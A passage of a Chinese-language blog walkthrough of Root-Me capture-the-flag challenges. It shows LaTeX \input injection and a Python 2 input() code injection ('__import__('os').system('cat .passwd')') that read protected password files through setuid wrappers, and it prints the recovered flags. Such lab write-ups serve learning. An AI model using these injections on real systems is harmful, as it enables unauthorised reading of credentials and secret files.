    <span class="n">setreuid</span><span class="p">(</span><span class="n">geteuid</span><span class="p">(),</span> <span class="n">geteuid</span><span class="p">());</span>
    <span class="n">execve</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">argv</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p>再查看 ch23.sh</p><div class="language-sh highlighter-rouge"><div class="code-header" text-data="sh"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
</pre><td class="rouge-code"><pre><span class="c">#!/usr/bin/env bash</span>

<span class="k">if</span> <span class="o">[[</span> <span class="nv">$# </span><span class="nt">-ne</span> 1 <span class="o">]]</span><span class="p">;</span> <span class="k">then
    </span><span class="nb">echo</span> <span class="s2">"Usage : </span><span class="k">${</span><span class="nv">0</span><span class="k">}</span><span class="s2"> TEX_FILE"</span>
<span class="k">fi

if</span> <span class="o">[[</span> <span class="nt">-f</span> <span class="s2">"</span><span class="k">${</span><span class="nv">1</span><span class="k">}</span><span class="s2">"</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then
    </span><span class="nv">TMP</span><span class="o">=</span><span class="si">$(</span><span class="nb">mktemp</span> <span class="nt">-d</span><span class="si">)</span>
    <span class="nb">cp</span> <span class="s2">"</span><span class="k">${</span><span class="nv">1</span><span class="k">}</span><span class="s2">"</span> <span class="s2">"</span><span class="k">${</span><span class="nv">TMP</span><span class="k">}</span><span class="s2">/main.tex"</span>

    <span class="c"># Compilation</span>
    <span class="nb">echo</span> <span class="s2">"[+] Compilation ..."</span>
    <span class="nb">timeout </span>5 /usr/bin/pdflatex <span class="se">\</span>
        <span class="nt">-halt-on-error</span> <span class="se">\</span>
        <span class="nt">-output-format</span><span class="o">=</span>pdf <span class="se">\</span>
        <span class="nt">-output-directory</span> <span class="s2">"</span><span class="k">${</span><span class="nv">TMP</span><span class="k">}</span><span class="s2">"</span> <span class="se">\</span>
        <span class="nt">-no-shell-escape</span> <span class="se">\</span>
        <span class="s2">"</span><span class="k">${</span><span class="nv">TMP</span><span class="k">}</span><span class="s2">/main.tex"</span> <span class="o">&gt;</span> /dev/null

    <span class="nb">timeout </span>5 /usr/bin/pdflatex <span class="se">\</span>
        <span class="nt">-halt-on-error</span> <span class="se">\</span>
        <span class="nt">-output-format</span><span class="o">=</span>pdf <span class="se">\</span>
        <span class="nt">-output-directory</span> <span class="s2">"</span><span class="k">${</span><span class="nv">TMP</span><span class="k">}</span><span class="s2">"</span> <span class="se">\</span>
        <span class="nt">-no-shell-escape</span> <span class="se">\</span>
        <span class="s2">"</span><span class="k">${</span><span class="nv">TMP</span><span class="k">}</span><span class="s2">/main.tex"</span> <span class="o">&gt;</span> /dev/null

    <span class="nb">chmod </span>u+w <span class="s2">"</span><span class="k">${</span><span class="nv">TMP</span><span class="k">}</span><span class="s2">/main.tex"</span>
    <span class="nb">rm</span> <span class="s2">"</span><span class="k">${</span><span class="nv">TMP</span><span class="k">}</span><span class="s2">/main.tex"</span>
    <span class="nb">chmod </span>750 <span class="nt">-R</span> <span class="s2">"</span><span class="k">${</span><span class="nv">TMP</span><span class="k">}</span><span class="s2">"</span>
    <span class="k">if</span> <span class="o">[[</span> <span class="nt">-f</span> <span class="s2">"</span><span class="k">${</span><span class="nv">TMP</span><span class="k">}</span><span class="s2">/main.pdf"</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then
        </span><span class="nb">echo</span> <span class="s2">"[+] Output file : </span><span class="k">${</span><span class="nv">TMP</span><span class="k">}</span><span class="s2">/main.pdf"</span>
    <span class="k">else
        </span><span class="nb">echo</span> <span class="s2">"[!] Compilation error, your logs : </span><span class="k">${</span><span class="nv">TMP</span><span class="k">}</span><span class="s2">/main.log"</span>
    <span class="k">fi
else
    </span><span class="nb">echo</span> <span class="s2">"[!] Can't access file </span><span class="k">${</span><span class="nv">1</span><span class="k">}</span><span class="s2">"</span>
<span class="k">fi</span>
</pre></table></code></div></div><p>通过参考一些网络上的文章，明白了主要思路就是写一个 LaTex 的源文件，然后在源文件里使用 input 函数来显示 .passwd 的内容。</p><p>首先需要一个 LaTex 源文件。</p><p>使用 vim 直接新建一个 LaTex 的源文件并不可行，因为文件不可写入。</p><p>于是根据 <code class="language-plaintext highlighter-rouge">ch23.sh</code> 文件内的代码发现一个可以用的指令 <code class="language-plaintext highlighter-rouge">mktemp</code>，经过查阅发现这个指令用于创建一个临时文件。</p><div class="language-sh highlighter-rouge"><div class="code-header" text-data="sh"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre><td class="rouge-code"><pre>app-script-ch23@challenge02:~<span class="nv">$ </span><span class="nb">mktemp</span>
/tmp/tmp.mprfMcooq7
</pre></table></code></div></div><p>创建了一个路径为 <code class="language-plaintext highlighter-rouge">/tmp/tmp.mprfMcooq7</code> 的临时文件。</p><p>通过代码 <code class="language-plaintext highlighter-rouge">vim /tmp/tmp.mprfMcooq7</code> 使用 vim 对这个文件进行编辑，并且复制进以下 LaTex 源码。</p><div class="language-latex highlighter-rouge"><div class="code-header" text-data="latex"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="k">\documentclass</span><span class="p">{</span>article<span class="p">}</span>
<span class="nt">\begin{document}</span>
<span class="k">\input</span><span class="p">{</span>/challenge/app-script/ch23/.passwd<span class="p">}</span>
<span class="nt">\end{document}</span>
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">Esc</code> + <code class="language-plaintext highlighter-rouge">:wq</code> 成功保存。</p><p>编译</p><div class="language-sh highlighter-rouge"><div class="code-header" text-data="sh"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>app-script-ch23@challenge02:~<span class="nv">$ </span>./setuid-wrapper /tmp/tmp.mprfMcooq7
<span class="o">[</span>+] Compilation ...
<span class="o">[</span>+] Output file : /tmp/tmp.jrJqLGOTOg/main.pdf
</pre></table></code></div></div><p>现在得到了 main.pdf 这个文件，里面应该有 input 进来的 .passwd 文件里的内容。</p><p>打开自己的终端，把这个 pdf 下载过来</p><div class="language-sh highlighter-rouge"><div class="code-header" text-data="sh"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre>C:<span class="se">\U</span>sers<span class="se">\S</span>tone&gt;scp <span class="nt">-P</span> 2222 app-script-ch23@challenge02.root-me.org:/tmp/tmp.jrJqLGOTOg/main.pdf <span class="nb">.</span>
Warning: Permanently added the ECDSA host key <span class="k">for </span>IP address <span class="s1">'[2001:bc8:35b0:c166::152]:2222'</span> to the list of known hosts.
      _           _ _                        ___ ____
  ___| |__   __ _| | | ___ _ __   __ _  ___ / _ <span class="se">\_</span>__ <span class="se">\</span>
 / __| <span class="s1">'_ \ / _` | | |/ _ \ '</span>_ <span class="se">\ </span>/ _<span class="sb">`</span> |/ _ <span class="se">\ </span>| | |__<span class="o">)</span> |
| <span class="o">(</span>__| | | | <span class="o">(</span>_| | | |  __/ | | | <span class="o">(</span>_| |  __/ |_| / __/
 <span class="se">\_</span>__|_| |_|<span class="se">\_</span>_,_|_|_|<span class="se">\_</span>__|_| |_|<span class="se">\_</span>_, |<span class="se">\_</span>__|<span class="se">\_</span>__/_____|
                                 |___/ root-me.org

app-script-ch23@challenge02.root-me.org<span class="s1">'s password:
main.pdf                                                                              100%   14KB 180.9KB/s   00:00
</span></pre></table></code></div></div><p>发现 Flag 被注释掉了</p><p>再次打开源文件，增加一行</p><p><code class="language-plaintext highlighter-rouge">\usepackage{verbatim}</code></p><p>以及将</p><p>改为 <code class="language-plaintext highlighter-rouge">\verbatim{/challenge/app-script/ch23/.passwd}</code></p><div class="language-latex highlighter-rouge"><div class="code-header" text-data="latex"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre><td class="rouge-code"><pre><span class="k">\documentclass</span><span class="p">{</span>article<span class="p">}</span>
<span class="k">\usepackage</span><span class="p">{</span>verbatim<span class="p">}</span>
<span class="nt">\begin{document}</span>
<span class="k">\verbatiminput</span><span class="p">{</span>/challenge/app-script/ch23/.passwd<span class="p">}</span>
<span class="nt">\end{document}</span>
</pre></table></code></div></div><p>重复之前的步骤，编译下载</p><div class="language-sh highlighter-rouge"><div class="code-header" text-data="sh"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>app-script-ch23@challenge02:~<span class="nv">$ </span>./setuid-wrapper /tmp/tmp.mprfMcooq7
<span class="o">[</span>+] Compilation ...
<span class="o">[</span>+] Output file : /tmp/tmp.g2WiS14pgf/main.pdf
</pre></table></code></div></div><p>妈蛋 LaTeX_1nput_1s_n0t_v3ry_s3kur3</p><p>参考</p><p>https://0day.work/hacking-with-latex/</p><p>https://exexute.github.io/2019/04/24/how-hacking-with-LaTex/</p><p>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection 关键代码在此</p><h2 id="python---input">Python - input()</h2><div class="language-sh highlighter-rouge"><div class="code-header" text-data="sh"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
</pre><td class="rouge-code"><pre><span class="o">[</span>Press Shift-F1 <span class="k">for </span><span class="nb">help</span><span class="o">]</span>

Host/IP or ssh:// URL <span class="o">[</span>localhost]: ssh://app-script-ch6:app-script-ch6@challenge
02
Connecting to ssh://app-script-ch6@challenge02:22

load pubkey <span class="s2">"/dev/null/.ssh/id_rsa"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_rsa"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_dsa"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_dsa"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_ecdsa"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_ecdsa"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_ecdsa_sk"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_ecdsa_sk"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_ed25519"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_ed25519"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_ed25519_sk"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_ed25519_sk"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_xmss"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_xmss"</span>: Not a directory
      _           _ _                        ___ ____
  ___| |__   __ _| | | ___ _ __   __ _  ___ / _ <span class="se">\_</span>__ <span class="se">\</span>
 / __| <span class="s1">'_ \ / _` | | |/ _ \ '</span>_ <span class="se">\ </span>/ _<span class="sb">`</span> |/ _ <span class="se">\ </span>| | |__<span class="o">)</span> |
| <span class="o">(</span>__| | | | <span class="o">(</span>_| | | |  __/ | | | <span class="o">(</span>_| |  __/ |_| / __/
 <span class="se">\_</span>__|_| |_|<span class="se">\_</span>_,_|_|_|<span class="se">\_</span>__|_| |_|<span class="se">\_</span>_, |<span class="se">\_</span>__|<span class="se">\_</span>__/_____|
                                 |___/ root-me.org

                                     ██▒ ▒██░
                                 ░███░ █ █ ░███▒
                             ░███░        ▓     ███░
                           ▓█▓       ▓█░  ▓       ▓███
                         ██▒     ░▓█▓███  ▓   ██  █▒ ░██
                        ██  ███  ▒░       ▓░████░██    ▓█░
                       ██   ▒██      ███      ░▓██      ▒█
                      ██             ░█░      ░██        ▓█
                     ░█████████████    █     ██░          █▓
                     ██                 █ ░██             ██
                     ██      ░         ░██▓               ██
                     ██  ███    ░██▓░███                 ███
                     ▒█          ▓██▓                  ░████
                      █▓    ░████                    ░██ ▒█
                      ▓█████░                      ███ ███▓
                      ▓███                      █████░ ████
                       ▓█     ░██▓░         ▒████████░  ██
                       ▓█      ██░▒██████████████████░  ██
                       ▓█       ███▓██▒  ░██████████░   ██
                       ▓█                  ░████▒       ██
                        ░██▓           ▒█▓           ▒██░
                           ▒██░       ██ ▒█        ██▓
                              █▒                  █
                              █▒  ░█    █░   █▓   █
                              █████████████████████

 ████████████▄                             ██    ███             ███
 ██          ██  ▄████████▄   ▄████████▄  ██████ ████           ████  ▄████████▄

 ██          ██ ██        ██ ██        ██  ██    ██  ██       ██  ██ ██        █
█
 ████████████▀  ██        ██ ██        ██  ██    ██   ██     ██   ██ ███████████
█
 ██    ███      ██        ██ ██        ██  ██    ██     ██ ██     ██ ██
 ██       ████   ▀████████▀   ▀████████▀   ██    ██       █       ██  ▀█████████
█

<span class="nt">--------------------------------------------------------------------------------</span>
<span class="nt">----------------</span>

    Welcome on challenge02    /

<span class="nt">-----------------------------</span>‘

/tmp and /var/tmp are writeable

Validation password is stored <span class="k">in</span> <span class="nv">$HOME</span>/.passwd

Useful commands available:
    python, perl, gcc, netcat, gdb, gdb-peda, gdb-gef, gdb-pwndbg, ROPgadget, ra
dare2

Attention:
    Publishing solutions publicly <span class="o">(</span>blog, github, youtube, etc.<span class="o">)</span> is forbidden.
    Publier des solutions publiquement <span class="o">(</span>blog, github, youtube, etc.<span class="o">)</span> est interdi
t.

<span class="nt">--------------------------------------------------------------------------------</span>
<span class="nt">----------------</span>

    Challenge informations   /

<span class="nt">----------------------------</span>‘

Use the ./setuid-wrapper to get the right privileges.

app-script-ch6@challenge02:~<span class="err">$</span>
</pre></table></code></div></div><div class="language-sh highlighter-rouge"><div class="code-header" text-data="sh"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
</pre><td class="rouge-code"><pre>app-script-ch6@challenge02:~<span class="nv">$ </span>ll
total 32
dr-xr-x---  2 app-script-ch6-cracked app-script-ch6         4096 May 19  2019 ./
drwxr-xr-x 23 root                   root                   4096 Aug 18 21:10 ../
<span class="nt">-rw-r-----</span>  1 app-script-ch6         app-script-ch6           54 Aug  8  2017 .motd
<span class="nt">-r--------</span>  1 app-script-ch6-cracked app-script-ch6-cracked   33 May 20  2014 .passwd
<span class="nt">-r-xr-x---</span>  1 app-script-ch6         app-script-ch6          365 Jun 12  2014 ch6.py<span class="k">*</span>
<span class="nt">-rwsr-x---</span>  1 app-script-ch6-cracked app-script-ch6         7260 May 19  2019 setuid-wrapper<span class="k">*</span>
<span class="nt">-r--r-----</span>  1 app-script-ch6-cracked app-script-ch6          207 May 19  2019 setuid-wrapper.c
</pre></table></code></div></div><p>查看 ch6.py 文件</p><div class="language-python highlighter-rouge"><div class="code-header" text-data="python"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre><td class="rouge-code"><pre><span class="c1">#!/usr/bin/python2
</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="k">def</span> <span class="nf">youLose</span><span class="p">():</span>
    <span class="k">print</span> <span class="s">"Try again ;-)"</span>
    <span class="n">sys</span><span class="p">.</span><span class="nb">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="k">try</span><span class="p">:</span>
    <span class="n">p</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"Please enter password : "</span><span class="p">)</span>
<span class="k">except</span><span class="p">:</span>
    <span class="n">youLose</span><span class="p">()</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">".passwd"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">passwd</span> <span class="o">=</span> <span class="n">f</span><span class="p">.</span><span class="n">readline</span><span class="p">().</span><span class="n">strip</span><span class="p">()</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">p</span> <span class="o">==</span> <span class="nb">int</span><span class="p">(</span><span class="n">passwd</span><span class="p">)):</span>
            <span class="k">print</span> <span class="s">"Well done ! You can validate with this password !"</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="n">youLose</span><span class="p">()</span>
</pre></table></code></div></div><p>再查看 setuid-wrapper.c</p><div class="language-c highlighter-rouge"><div class="code-header" text-data="c"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
</pre><td class="rouge-code"><pre><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
</span>
<span class="cm">/* setuid script wrapper */</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">setreuid</span><span class="p">(</span><span class="n">geteuid</span><span class="p">(),</span> <span class="n">geteuid</span><span class="p">());</span>
    <span class="n">system</span><span class="p">(</span><span class="s">"/challenge/app-script/ch6/ch6.py"</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><div class="language-sh highlighter-rouge"><div class="code-header" text-data="sh"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>app-script-ch6@challenge02:~<span class="nv">$ </span>./setuid-wrapper
Please enter password : __import__<span class="o">(</span><span class="s1">'os'</span><span class="o">)</span>.system<span class="o">(</span><span class="s1">'cat .passwd'</span><span class="o">)</span>
13373439872909134298363103573901
</pre></table></code></div></div><p>https://blog.51cto.com/u_12332766/2299894</p><p>https://www.cnblogs.com/heycomputer/articles/10537633.html</p><h2 id="bash---shells-restreints">Bash - Shells restreints</h2><p>提示语 RTFM</p><p>Énoncé Récupérez le mot de passe de validation dans le fichier .passwd.</p><p>Votre objectif est d’escalader les utilisateurs un par un à l’aide des commandes disponibles, pour arriver jusqu’à app-script-ch14-14 qui aura les droits de lecture sur le fichier .passwd.</p><p>官方索引： <a href="http://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/EN%20-%20Escaping%20Restricted%20Linux%20Shells%20-%20Escaping%20Restricted%20Linux%20Shells.pdf">Escaping Restricted Linux Shells - Escaping Restricted Linux Shells</a></p><p><a href="http://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/FR%20-%20Shells%20restreints%20comment%20les%20d%C3%A9tourner%20-%20Dawid%20Go%C5%82u%C5%84ski.pdf">Shells restreints comment les détourner - Dawid Gołuński</a></p><div class="language-sh highlighter-rouge"><div class="code-header" text-data="sh"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
</pre><td class="rouge-code"><pre><span class="o">[</span>Press Shift-F1 <span class="k">for </span><span class="nb">help</span><span class="o">]</span>

Host/IP or ssh:// URL <span class="o">[</span>localhost]: ssh://app-script-ch14:app-script-ch14@challen
ge02
Connecting to ssh://app-script-ch14@challenge02:22

load pubkey <span class="s2">"/dev/null/.ssh/id_rsa"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_rsa"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_dsa"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_dsa"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_ecdsa"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_ecdsa"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_ecdsa_sk"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_ecdsa_sk"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_ed25519"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_ed25519"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_ed25519_sk"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_ed25519_sk"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_xmss"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_xmss"</span>: Not a directory
      _           _ _                        ___ ____
  ___| |__   __ _| | | ___ _ __   __ _  ___ / _ <span class="se">\_</span>__ <span class="se">\</span>
 / __| <span class="s1">'_ \ / _` | | |/ _ \ '</span>_ <span class="se">\ </span>/ _<span class="sb">`</span> |/ _ <span class="se">\ </span>| | |__<span class="o">)</span> |
| <span class="o">(</span>__| | | | <span class="o">(</span>_| | | |  __/ | | | <span class="o">(</span>_| |  __/ |_| / __/
 <span class="se">\_</span>__|_| |_|<span class="se">\_</span>_,_|_|_|<span class="se">\_</span>__|_| |_|<span class="se">\_</span>_, |<span class="se">\_</span>__|<span class="se">\_</span>__/_____|
                                 |___/ root-me.org

                                     ██▒ ▒██░
                                 ░███░ █ █ ░███▒
                             ░███░        ▓     ███░
                           ▓█▓       ▓█░  ▓       ▓███
                         ██▒     ░▓█▓███  ▓   ██  █▒ ░██
                        ██  ███  ▒░       ▓░████░██    ▓█░
                       ██   ▒██      ███      ░▓██      ▒█
                      ██             ░█░      ░██        ▓█
                     ░█████████████    █     ██░          █▓
                     ██                 █ ░██             ██
                     ██      ░         ░██▓               ██
                     ██  ███    ░██▓░███                 ███
                     ▒█          ▓██▓                  ░████
                      █▓    ░████                    ░██ ▒█
                      ▓█████░                      ███ ███▓
                      ▓███                      █████░ ████
                       ▓█     ░██▓░         ▒████████░  ██
                       ▓█      ██░▒██████████████████░  ██
                       ▓█       ███▓██▒  ░██████████░   ██
                       ▓█                  ░████▒       ██
                        ░██▓           ▒█▓           ▒██░
                           ▒██░       ██ ▒█        ██▓
                              █▒                  █
                              █▒  ░█    █░   █▓   █
                              █████████████████████

 ████████████▄                             ██    ███             ███
 ██          ██  ▄████████▄   ▄████████▄  ██████ ████           ████  ▄████████▄

 ██          ██ ██        ██ ██        ██  ██    ██  ██       ██  ██ ██        █
█
 ████████████▀  ██        ██ ██        ██  ██    ██   ██     ██   ██ ███████████
█
 ██    ███      ██        ██ ██        ██  ██    ██     ██ ██     ██ ██
 ██       ████   ▀████████▀   ▀████████▀   ██    ██       █       ██  ▀█████████
█

<span class="nt">--------------------------------------------------------------------------------</span>
<span class="nt">----------------</span>

    Welcome on challenge02    /

<span class="nt">-----------------------------</span>‘

/tmp and /var/tmp are writeable

Validation password is stored <span class="k">in</span> <span class="nv">$HOME</span>/.passwd

Useful commands available:
    python, perl, gcc, netcat, gdb, gdb-peda, gdb-gef, gdb-pwndbg, ROPgadget, ra
dare2

Attention:
    Publishing solutions publicly <span class="o">(</span>blog, github, youtube, etc.<span class="o">)</span> is forbidden.
    Publier des solutions publiquement <span class="o">(</span>blog, github, youtube, etc.<span class="o">)</span> est interdi
t.

           <span class="o">======================</span>
           <span class="o">||</span> Restricted shell <span class="o">||</span>
      <span class="o">================================</span>
       <span class="o">||</span>     <span class="o">||</span>&lt;<span class="o">(</span>.<span class="o">)&gt;||</span>&lt;<span class="o">(</span>.<span class="o">)&gt;||</span>     <span class="o">||</span>
       <span class="o">||</span>    _||     <span class="o">||</span>     <span class="o">||</span>_    <span class="o">||</span>
       <span class="o">||</span>   <span class="o">(</span>__D     <span class="o">||</span>     C__<span class="o">)</span>   <span class="o">||</span>
       <span class="o">||</span>   <span class="o">(</span>__D     <span class="o">||</span>     C__<span class="o">)</span>   <span class="o">||</span>
       <span class="o">||</span>   <span class="o">(</span>__D     <span class="o">||</span>     C__<span class="o">)</span>   <span class="o">||</span>
       <span class="o">||</span>   <span class="o">(</span>__D     <span class="o">||</span>     C__<span class="o">)</span>   <span class="o">||</span>
       <span class="o">||</span>     <span class="o">||</span>     <span class="o">||</span>     <span class="o">||</span>     <span class="o">||</span>
      <span class="o">================================</span>
 <span class="k">*</span> Don<span class="s1">'t forget to check '</span><span class="nb">sudo</span> <span class="nt">-l</span><span class="s1">' for all steps.
 * No output network access authorized.
 * Keep your commands on hand ;)

app-script-ch14@challenge02:~$
</span></pre></table></code></div></div><p>参考： https://habr.com/ru/post/321760/</p><h1 id="web---serveur">Web - Serveur</h1><h2 id="html---code-source">HTML - Code source</h2><p>chrome 直接 F12 查看源代码</p><div class="language-html highlighter-rouge"><div class="code-header" text-data="html"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre><span class="c">&lt;!--
                                                                                                                                                                                                                                                        Je crois que c'est vraiment trop simple là !
                                                                                                                                                                                                                                                            It's really too easy !
                                                                                                                                                                                                                                                                 password : nZ^&amp;@q5&amp;sjJHev0

--&gt;</span>
</pre></table></code></div></div><h2 id="http---user-agent">HTTP - User-agent</h2><p>查看源码</p><p>使用 chrome 自带工具修改 user-agent</p><p>https://exp-blog.com/safe/ctf/rootme/web-server/http-user-agent/</p><p>user-agent 修改教程 https://dysaniazzz.github.io/2019/06/06/useragent/</p><h2 id="http---post">HTTP - POST</h2><p>提示语：Connaissez-vous le protocole HTTP ?</p><p>官方参考： https://en.wikipedia.org/wiki/POST_(HTTP)</p><p>查看源码，修改，提交</p><p>https://exp-blog.com/safe/ctf/rootme/web-server/http-post/</p><p>右键 -&gt; Edit as HTML</p><h1 id="app---système">App - Système</h1><p>http://showlinkroom.me/2017/11/20/Root-me-App-System01/</p><h2 id="elf-x86---stack-buffer-overflow-basic-1">ELF x86 - Stack buffer overflow basic 1</h2><div class="language-shell highlighter-rouge"><div class="code-header" text-data="shell"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
</pre><td class="rouge-code"><pre><span class="o">[</span>Press Shift-F1 <span class="k">for </span><span class="nb">help</span><span class="o">]</span>

Host/IP or ssh:// URL <span class="o">[</span>localhost]: ssh://app-systeme-ch13:app-systeme-ch13@chall
enge02
Connecting to ssh://app-systeme-ch13@challenge02:22

load pubkey <span class="s2">"/dev/null/.ssh/id_rsa"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_rsa"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_dsa"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_dsa"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_ecdsa"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_ecdsa"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_ecdsa_sk"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_ecdsa_sk"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_ed25519"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_ed25519"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_ed25519_sk"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_ed25519_sk"</span>: Not a directory
load pubkey <span class="s2">"/dev/null/.ssh/id_xmss"</span>: Not a directory
